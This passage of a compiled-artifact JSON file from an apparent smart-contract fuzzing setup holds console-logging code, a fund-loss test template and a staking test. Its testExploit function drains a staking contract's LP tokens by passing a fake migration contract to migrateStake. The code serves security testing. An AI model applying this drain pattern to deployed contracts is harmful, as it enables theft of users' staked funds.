p0, bool p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, bool p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,bool,address,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint256 p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint256,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint256 p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint256,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint256 p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint256,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, uint256 p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,uint256,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, string memory p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,string,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, bool p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,bool,address)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, uint256 p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,uint256)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, string memory p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,string)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, bool p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,bool)\", p0, p1, p2, p3));\n    }\n\n    function log(address p0, address p1, address p2, address p3) internal view {\n        _sendLogPayload(abi.encodeWithSignature(\"log(address,address,address,address)\", p0, p1, p2, p3));\n    }\n\n}","sourceMap":"515:68470:24:-:0;;;;;;;;;;;;;;;-1:-1:-1;;;515:68470:24;;;;;;;;;;;;;;;;;","sourceMapDeployed":"515:68470:24:-:0;;;;;;;;","constructor":null,"functions":[],"functionalLines":[]},{"name":"FakeStaking","artifactPath":"out/FakeStaking.sol/FakeStaking.json","sourcePath":"test/pnm/FakeStaking.sol","contractId":"test/pnm/FakeStaking.sol:FakeStaking","sourceFileId":26,"sourceContent":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.4;\n\ncontract FakeStaking {\n    function migrateWithdraw(address, uint256) public {}\n}\n","sourceMap":"64:81:26:-:0;;;;;;;;;;;;;;;;;;;","sourceMapDeployed":"64:81:26:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;91:52;;;;;;:::i;:::-;;;;;;14:354:29;82:6;90;143:2;131:9;122:7;118:23;114:32;111:52;;;159:1;156;149:12;111:52;185:23;;-1:-1:-1;;;;;237:31:29;;227:42;;217:70;;283:1;280;273:12;217:70;306:5;358:2;343:18;;;;330:32;;-1:-1:-1;;;14:354:29:o","constructor":null,"functions":[{"id":"test/pnm/FakeStaking.sol:FakeStaking:migrateWithdraw(address,uint256)","contractId":"test/pnm/FakeStaking.sol:FakeStaking","signature":"migrateWithdraw(address,uint256)","shortSignature":"3c24436c","name":"migrateWithdraw","inputs":[{"name":"","kind":"Address","internalType":"address"},{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[0,4,5]},{"name":"FundLossTest","artifactPath":"out/FundLossTest.sol/FundLossTest.json","sourcePath":"test/pnm/FundLossTest.sol","contractId":"test/pnm/FundLossTest.sol:FundLossTest","sourceFileId":27,"sourceContent":"// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0 <0.9.0;\n\nimport {FundLossRecipe} from \"@pwnednomore/contracts/recipes/FundLossRecipe.sol\";\n\ncontract FundLossTest is FundLossRecipe {\n    // MyContract myContract;\n\n    // Define how to deploy the contract(s) to be tested\n    // Returns the one for balance checking\n    function deploy() public override returns (address) {\n        // TODO: Implemement this\n        // e.g.\n        // myContract = new MyContract(\"ETH\");\n        // return address(myContract);\n        return address(0);\n    }\n\n    // Define how to calculate the vaule you want to check\n    function getTargetBalance(address target)\n        public\n        override\n        returns (uint256)\n    {\n        // TODO: Implemement this\n        // e.g.\n        // return address(myContract).balance + myContract.getAllTokenBalanceInEth();\n        return 0;\n    }\n\n    // TODO: To customize report trigerring condition, you could override following functions:\n    // function checkProtocolFundIsSafe(address protocol, uint256 initValue) public override {}\n    // function checkUserFundIsSafe(address user, uint256 initValue) public override {}\n    // function checkAgentFundNoGain(address agent, uint256 initValue) public override {}\n}\n","sourceMap":"1572:26:18:-:0;;;-1:-1:-1;;170:28:19;;;;;188:17:25;148:1102:27;188:17:25;;148:1102:27;188:17:25;;;-1:-1:-1;;;188:17:25;;;;:8;:17::i;:::-;172:33;;;-1:-1:-1;;;;;;172:33:25;-1:-1:-1;;;;;172:33:25;;;;;;;;;;226:16;;;;;;;;;;;;-1:-1:-1;;;226:16:25;;;;;;:8;:16::i;:::-;211:31;;;-1:-1:-1;;;;;;211:31:25;-1:-1:-1;;;;;211:31:25;;;;;;;;;;148:1102:27;;;;;;;;;;;;3082:116:21;3137:12;3171:20;3186:4;3171:14;:20::i;:::-;-1:-1:-1;3161:30:21;3082:116;-1:-1:-1;;3082:116:21:o;2810:233::-;2871:12;2885:18;2963:4;2946:22;;;;;;;;:::i;:::-;;;;;;;-1:-1:-1;;2946:22:21;;;;;;;2936:33;;2946:22;2936:33;;;;-1:-1:-1;;;;;;2987:19:21;;;;;709:25:29;;;2936:33:21;-1:-1:-1;250:64:19;;2987:7:21;;682:18:29;;2987:19:21;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;3016:20;;-1:-1:-1;;;3016:20:21;;2980:26;;-1:-1:-1;250:64:19;;3016:8:21;;:20;;2980:26;;3031:4;;3016:20;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2810:233;;;:::o;14:250:29:-;99:1;109:113;123:6;120:1;117:13;109:113;;;199:11;;;193:18;180:11;;;173:39;145:2;138:10;109:113;;;-1:-1:-1;;256:1:29;238:16;;231:27;14:250::o;269:289::-;400:3;438:6;432:13;454:66;513:6;508:3;501:4;493:6;489:17;454:66;:::i;:::-;536:16;;;;;269:289;-1:-1:-1;;269:289:29:o;745:290::-;815:6;868:2;856:9;847:7;843:23;839:32;836:52;;;884:1;881;874:12;836:52;910:16;;-1:-1:-1;;;;;955:31:29;;945:42;;935:70;;1001:1;998;991:12;935:70;1024:5;745:290;-1:-1:-1;;;745:290:29:o;1040:493::-;1246:1;1242;1237:3;1233:11;1229:19;1221:6;1217:32;1206:9;1199:51;1286:2;1281;1270:9;1266:18;1259:30;1180:4;1318:6;1312:13;1361:6;1356:2;1345:9;1341:18;1334:34;1377:79;1449:6;1444:2;1433:9;1429:18;1424:2;1416:6;1412:15;1377:79;:::i;:::-;1517:2;1496:15;-1:-1:-1;;1492:29:29;1477:45;;;;1524:2;1473:54;;1040:493;-1:-1:-1;;;1040:493:29:o;:::-;148:1102:27;;;;;;","sourceMapDeployed":"148:1102:27:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1296:363:25;;;;;;:::i;:::-;;:::i;:::-;;590:106:16;;;;;;:::i;:::-;;:::i;355:263:25:-;;;:::i;1170:107:16:-;;;;;;:::i;:::-;;:::i;613:265:27:-;;;;;;:::i;:::-;-1:-1:-1;704:7:27;;613:265;;;;1261:25:29;;;1249:2;1234:18;613:265:27;;;;;;;;321:38:19;;250:64;321:38;;;;;-1:-1:-1;;;;;1473:32:29;;;1455:51;;1443:2;1428:18;321:38:19;1297:215:29;884:105:16;;;;;;:::i;:::-;;:::i;326:222:27:-;369:7;326:222;;1059:62:16;;;:::i;624:209:25:-;;;:::i;396:82:16:-;;;;;;:::i;:::-;;:::i;1819:584:18:-;;;:::i;:::-;;;2111:14:29;;2104:22;2086:41;;2074:2;2059:18;1819:584:18;1946:187:29;353:94:15;220:22;353:94;;798:81:16;;;;;;:::i;:::-;;:::i;1665:347:25:-;;;;;;:::i;:::-;;:::i;2018:508::-;;;;;;:::i;:::-;;:::i;170:28:19:-;;;;;;;;;;;;1572:26:18;;;;;;;;;1296:363:25;1415:13;;1411:242;;1467:31;;-1:-1:-1;;;1467:31:25;;-1:-1:-1;;;;;1473:32:29;;1467:31:25;;;1455:51:29;1444:20:25;;1467:4;;:21;;1428:18:29;;1467:31:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1444:54;-1:-1:-1;1553:13:25;1565:1;1553:9;:13;:::i;:::-;1537:12;:29;;1512:130;;;;-1:-1:-1;;;1512:130:25;;2751:2:29;1512:130:25;;;2733:21:29;2790:2;2770:18;;;2763:30;2829:34;2809:18;;;2802:62;-1:-1:-1;;;2880:18:29;;;2873:40;2930:19;;1512:130:25;;;;;;;;;1430:223;1411:242;1296:363;;:::o;590:106:16:-;667:22;;-1:-1:-1;;;667:22:16;;-1:-1:-1;;;;;3190:15:29;;;667:22:16;;;3172:34:29;3242:15;;3222:18;;;3215:43;250:64:19;;667:8:16;;3107:18:29;;667:22:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;590:106;;:::o;355:263:25:-;397:10;:8;:10::i;:::-;389:5;;:18;;;;;-1:-1:-1;;;;;389:18:25;;;;;-1:-1:-1;;;;;389:18:25;;;;;;428:4;-1:-1:-1;;;;;428:11:25;;:13;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;417:8;:24;;-1:-1:-1;;;;;;417:24:25;-1:-1:-1;;;;;417:24:25;;;;;;;;;472:31;;-1:-1:-1;;;472:31:25;;;;;1455:51:29;;;;472:4:25;;:21;;1428:18:29;;472:31:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;452:17;:51;551:4;;529:27;;-1:-1:-1;;;529:27:25;;-1:-1:-1;;;;;551:4:25;;;529:27;;;1455:51:29;529:4:25;;:21;;1428:18:29;;529:27:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;513:13;:43;605:5;;583:28;;-1:-1:-1;;;583:28:25;;-1:-1:-1;;;;;605:5:25;;;583:28;;;1455:51:29;583:4:25;;:21;;1428:18:29;;583:28:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;566:14;:45;355:263::o;1170:107:16:-;1246:24;;-1:-1:-1;;;1246:24:16;;-1:-1:-1;;;;;3717:32:29;;1246:24:16;;;3699:51:29;3766:18;;;3759:34;;;250:64:19;;1246:7:16;;3672:18:29;;1246:24:16;3525:274:29;884:105:16;955:27;;-1:-1:-1;;;955:27:16;;-1:-1:-1;;;;;3190:15:29;;;955:27:16;;;3172:34:29;3242:15;;3222:18;;;3215:43;250:64:19;;955:13:16;;3107:18:29;;955:27:16;2960:304:29;1059:62:16;1100:14;;;-1:-1:-1;;;1100:14:16;;;;250:64:19;;1100:12:16;;:14;;;;;274:37:19;;1100:14:16;;;;;;;274:37:19;250:64;1100:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;1059:62::o;624:209:25:-;695:8;;705:17;;671:52;;-1:-1:-1;;;;;695:8:25;;671:23;:52::i;:::-;753:4;;759:13;;733:40;;-1:-1:-1;;;;;753:4:25;;733:19;:40::i;:::-;804:5;;811:14;;783:43;;-1:-1:-1;;;;;804:5:25;;783:20;:43::i;:::-;624:209::o;396:82:16:-;457:14;;-1:-1:-1;;;457:14:16;;-1:-1:-1;;;;;1473:32:29;;457:14:16;;;1455:51:29;250:64:19;;457:8:16;;1428:18:29;;457:14:16;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;396:82;:::o;1819:584:18:-;1853:4;1873:7;;;;;;;1869:528;;;-1:-1:-1;1903:7:18;;;;;;;;1819:584::o;1869:528::-;1941:17;2990:42;2978:55;3059:16;1980:374;;2196:43;;;1671:64;2196:43;;;3699:51:29;;;-1:-1:-1;;;3766:18:29;;;3759:34;2196:43:18;;;;;;;;;3672:18:29;;;2196:43:18;;;-1:-1:-1;;1671:64:18;;2086:175;;2135:34;;2086:175;;;:::i;:::-;;;;-1:-1:-1;;2086:175:18;;;;;;;;;;2047:232;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;2020:259;;;2323:7;2312:27;;;;;;;;;;;;:::i;:::-;2297:42;;2002:352;1980:374;2374:12;1819:584;-1:-1:-1;1819:584:18:o;798:81:16:-;853:19;;-1:-1:-1;;;853:19:16;;-1:-1:-1;;;;;1473:32:29;;853:19:16;;;1455:51:29;250:64:19;;853:13:16;;1428:18:29;;853:19:16;1297:215:29;1665:347:25;1776:13;;1772:234;;1828:27;;-1:-1:-1;;;1828:27:25;;-1:-1:-1;;;;;1473:32:29;;1828:27:25;;;1455:51:29;1805:20:25;;1828:4;;:21;;1428:18:29;;1828:27:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;1805:50;-1:-1:-1;1910:13:25;1922:1;1910:9;:13;:::i;:::-;1894:12;:29;;1869:126;;;;-1:-1:-1;;;1869:126:25;;5371:2:29;1869:126:25;;;5353:21:29;5410:2;5390:18;;;5383:30;5449:34;5429:18;;;5422:62;-1:-1:-1;;;5500:18:29;;;5493:36;5546:19;;1869:126:25;5169:402:29;2018:508:25;2150:28;;-1:-1:-1;;;2150:28:25;;-1:-1:-1;;;;;1473:32:29;;2150:28:25;;;1455:51:29;2127:20:25;;2150:4;;:21;;1428:18:29;;2150:28:25;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;2127:51;;2192:9;2205:1;2192:14;2188:332;;2247:17;;2222:115;;;;-1:-1:-1;;;2222:115:25;;5778:2:29;2222:115:25;;;5760:21:29;5817:2;5797:18;;;5790:30;5856:34;5836:18;;;5829:62;-1:-1:-1;;;5907:18:29;;;5900:37;5954:19;;2222:115:25;5576:403:29;2222:115:25;2188:332;;;2421:13;2433:1;2421:9;:13;:::i;:::-;2409:25;;:9;:25;:::i;:::-;2393:12;:42;2368:141;;;;-1:-1:-1;;;2368:141:25;;6413:2:29;2368:141:25;;;6395:21:29;6452:2;6432:18;;;6425:30;6491:34;6471:18;;;6464:62;-1:-1:-1;;;6542:18:29;;;6535:38;6590:19;;2368:141:25;6211:404:29;250:97:15;314:26;;-1:-1:-1;;;;;;314:26:15;;220:22;314:26;;;1261:25:29;288:7:15;;250:64:19;;314:7:15;;1234:18:29;;314:26:15;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;307:33;;250:97;:::o;14:131:29:-;-1:-1:-1;;;;;89:31:29;;79:42;;69:70;;135:1;132;125:12;69:70;14:131;:::o;150:315::-;218:6;226;279:2;267:9;258:7;254:23;250:32;247:52;;;295:1;292;285:12;247:52;334:9;321:23;353:31;378:5;353:31;:::i;:::-;403:5;455:2;440:18;;;;427:32;;-1:-1:-1;;;150:315:29:o;470:388::-;538:6;546;599:2;587:9;578:7;574:23;570:32;567:52;;;615:1;612;605:12;567:52;654:9;641:23;673:31;698:5;673:31;:::i;:::-;723:5;-1:-1:-1;780:2:29;765:18;;752:32;793:33;752:32;793:33;:::i;:::-;845:7;835:17;;;470:388;;;;;:::o;863:247::-;922:6;975:2;963:9;954:7;950:23;946:32;943:52;;;991:1;988;981:12;943:52;1030:9;1017:23;1049:31;1074:5;1049:31;:::i;:::-;1099:5;863:247;-1:-1:-1;;;863:247:29:o;2138:184::-;2208:6;2261:2;2249:9;2240:7;2236:23;2232:32;2229:52;;;2277:1;2274;2267:12;2229:52;-1:-1:-1;2300:16:29;;2138:184;-1:-1:-1;2138:184:29:o;2327:217::-;2367:1;2393;2383:132;;2437:10;2432:3;2428:20;2425:1;2418:31;2472:4;2469:1;2462:15;2500:4;2497:1;2490:15;2383:132;-1:-1:-1;2529:9:29;;2327:217::o;3269:251::-;3339:6;3392:2;3380:9;3371:7;3367:23;3363:32;3360:52;;;3408:1;3405;3398:12;3360:52;3440:9;3434:16;3459:31;3484:5;3459:31;:::i;4083:322::-;4124:3;4162:5;4156:12;4186:1;4196:128;4210:6;4207:1;4204:13;4196:128;;;4307:4;4292:13;;;4288:24;;4282:31;4269:11;;;4262:52;4225:12;4196:128;;;-1:-1:-1;4379:1:29;4343:16;;4368:13;;;-1:-1:-1;4343:16:29;;4083:322;-1:-1:-1;4083:322:29:o;4410:278::-;-1:-1:-1;;;;;;4595:33:29;;4583:46;;4565:3;4645:37;4679:1;4670:11;;4662:6;4645:37;:::i;:::-;4638:44;4410:278;-1:-1:-1;;;;4410:278:29:o;4693:189::-;4822:3;4847:29;4872:3;4864:6;4847:29;:::i;4887:277::-;4954:6;5007:2;4995:9;4986:7;4982:23;4978:32;4975:52;;;5023:1;5020;5013:12;4975:52;5055:9;5049:16;5108:5;5101:13;5094:21;5087:5;5084:32;5074:60;;5130:1;5127;5120:12;5984:222;6049:9;;;6070:10;;;6067:133;;;6122:10;6117:3;6113:20;6110:1;6103:31;6157:4;6154:1;6147:15;6185:4;6182:1;6175:15;6067:133;5984:222;;;;:::o","constructor":null,"functions":[{"id":"test/pnm/FundLossTest.sol:FundLossTest:IS_SCRIPT()(bool)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"IS_SCRIPT():(bool)","shortSignature":"f8ccbf47","name":"IS_SCRIPT","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:IS_TEST()(bool)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"IS_TEST():(bool)","shortSignature":"fa7626d4","name":"IS_TEST","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:asAccountBegin(address,address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"asAccountBegin(address,address)","shortSignature":"3eb644f6","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:asAccountBegin(address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"asAccountBegin(address)","shortSignature":"d8fdc41d","name":"asAccountBegin","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:asAccountEnd()","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"asAccountEnd()","shortSignature":"8667f1bb","name":"asAccountEnd","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:asAccountForNextCall(address,address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"asAccountForNextCall(address,address)","shortSignature":"03c70e04","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"},{"name":"origin","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:asAccountForNextCall(address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"asAccountForNextCall(address)","shortSignature":"9d7f502f","name":"asAccountForNextCall","inputs":[{"name":"addr","kind":"Address","internalType":"address"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:checkAgentFundNoGain(address,uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"checkAgentFundNoGain(address,uint256)","shortSignature":"e7536a1d","name":"checkAgentFundNoGain","inputs":[{"name":"agent","kind":"Address","internalType":"address"},{"name":"initValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:checkProtocolFundIsSafe(address,uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"checkProtocolFundIsSafe(address,uint256)","shortSignature":"03b56e79","name":"checkProtocolFundIsSafe","inputs":[{"name":"protocol","kind":"Address","internalType":"address"},{"name":"initValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:checkUserFundIsSafe(address,uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"checkUserFundIsSafe(address,uint256)","shortSignature":"daacf1bd","name":"checkUserFundIsSafe","inputs":[{"name":"user","kind":"Address","internalType":"address"},{"name":"initValue","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:deploy()(address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"deploy():(address)","shortSignature":"775c300c","name":"deploy","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"address"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:failed()(bool)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"failed():(bool)","shortSignature":"ba414fa6","name":"failed","inputs":[],"outputs":[{"name":"","kind":"Bool","internalType":"bool"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:getAgentKey()(uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"getAgentKey():(uint256)","shortSignature":"ce670b30","name":"getAgentKey","inputs":[],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"pure","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:getTargetBalance(address)(uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"getTargetBalance(address):(uint256)","shortSignature":"3989650f","name":"getTargetBalance","inputs":[{"name":"target","kind":"Address","internalType":"address"}],"outputs":[{"name":"","kind":{"Uint":256},"internalType":"uint256"}],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:invariantCheckFund()","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"invariantCheckFund()","shortSignature":"8bbbf542","name":"invariantCheckFund","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":true,"isInvariant":true,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:setNativeBalance(address,uint256)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"setNativeBalance(address,uint256)","shortSignature":"1c050e97","name":"setNativeBalance","inputs":[{"name":"account","kind":"Address","internalType":"address"},{"name":"amount","kind":{"Uint":256},"internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:setUp()","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"setUp()","shortSignature":"0a9254e4","name":"setUp","inputs":[],"outputs":[],"stateMutability":"nonpayable","isSetup":true,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:vm()(address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"vm():(address)","shortSignature":"3a768463","name":"vm","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract Vm"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false},{"id":"test/pnm/FundLossTest.sol:FundLossTest:vmEx()(address)","contractId":"test/pnm/FundLossTest.sol:FundLossTest","signature":"vmEx():(address)","shortSignature":"905a71a9","name":"vmEx","inputs":[],"outputs":[{"name":"","kind":"Address","internalType":"contract VmEx"}],"stateMutability":"view","isSetup":false,"isAction":false,"isTest":false,"isInvariant":false,"isProperty":false}],"functionalLines":[0,6,11,20,23]},{"name":"StaxLPStakingTest","artifactPath":"out/StaxLPStaking.t.sol/StaxLPStakingTest.json","sourcePath":"test/pnm/StaxLPStaking.t.sol","contractId":"test/pnm/StaxLPStaking.t.sol:StaxLPStakingTest","sourceFileId":28,"sourceContent":"// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.4;\n\nimport \"./FakeStaking.sol\";\n\nimport \"contracts/StaxLP.sol\";\nimport \"contracts/StaxLPStaking.sol\";\nimport \"@pwnednomore/contracts/PTest.sol\";\n\ncontract StaxLPStakingTest is PTest {\n    StaxLP lp;\n    StaxLPStaking lpStaking;\n\n    address owner = address(0x1);\n    address user = address(0x2);\n    uint256 userLpAmount = 1 ether;\n\n    address agent;\n\n    function setUp() public {\n        // Deploy LP token and LP staking contract\n        vm.startPrank(owner);\n        lp = new StaxLP(\"Stax Frax/Temple LP Token\", \"xFraxTempleLP\");\n        lpStaking = new StaxLPStaking(address(lp), owner);\n        vm.stopPrank();\n\n        // Create a user who is going to stake 1 ether LP tokens\n        vm.startPrank(user);\n        deal(address(lp), user, userLpAmount);\n        lp.approve(address(lpStaking), type(uint256).max);\n        lpStaking.stakeAll();\n        vm.stopPrank();\n\n        agent = getAgent();\n    }\n\n    // User should always be able to withdraw the tokens once staked\n    function invariantGetWhatPut() public {\n        vm.prank(user);\n        lpStaking.withdrawAll(false);\n        assert(lp.balanceOf(user) >= userLpAmount);\n    }\n\n    // Exploit\n    function testExploit() public {\n        address attacker = address(0x3);\n        vm.startPrank(attacker);\n\n        FakeStaking fakeStaking = new FakeStaking();\n        uint256 amount = lp.balanceOf(address(lpStaking));\n        lpStaking.migrateStake(address(fakeStaking), amount);\n        lpStaking.withdrawAll(false);\n\n        emit 